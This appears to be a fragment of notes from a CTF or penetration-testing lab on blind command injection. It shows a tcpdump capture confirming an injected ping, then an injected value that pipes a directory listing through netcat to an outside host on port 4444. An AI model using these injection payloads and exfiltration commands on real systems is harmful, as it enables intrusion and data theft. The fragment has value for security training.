```
sudo tcpdump ip proto \\icmp -i tun0

john; ping 10.11.22.251 -c2

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
08:47:54.092564 IP 10.10.25.113 > ubuntu: ICMP echo request, id 1355, seq 1, length 64
08:47:54.092630 IP ubuntu > 10.10.25.113: ICMP echo reply, id 1355, seq 1, length 64

 js; ls -la | nc 10.11.22.251 4444
```
